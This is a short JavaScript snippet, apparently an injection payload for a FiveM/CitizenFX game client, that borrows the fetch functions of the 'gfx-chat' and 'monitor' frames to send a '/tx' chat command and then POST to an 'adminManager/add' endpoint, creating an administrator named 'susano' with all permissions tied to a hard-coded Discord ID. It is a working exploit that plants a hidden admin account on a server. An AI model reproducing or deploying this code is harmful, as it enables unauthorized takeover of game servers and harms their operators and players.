const chat = top.window.citFrames["gfx-chat"].contentWindow;
const fetchChat = chat.fetch;
fetchChat("https://gfx-chat/chatResult", {
  method: "POST",
  body: JSON.stringify({ message: "/tx" })
});

const tx = top.window.citFrames["monitor"].contentWindow;
const fetchTx = tx.fetch;
fetchTx("https://monitor/WebPipe//adminManager/add", {
  headers: {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest"
  },
  body: "name=susano&citizenfxID=&discordID=864451956235304980&permissions%5B%5D=all_permissions",
  method: "POST",
  mode: "cors",
  credentials: "omit"
});
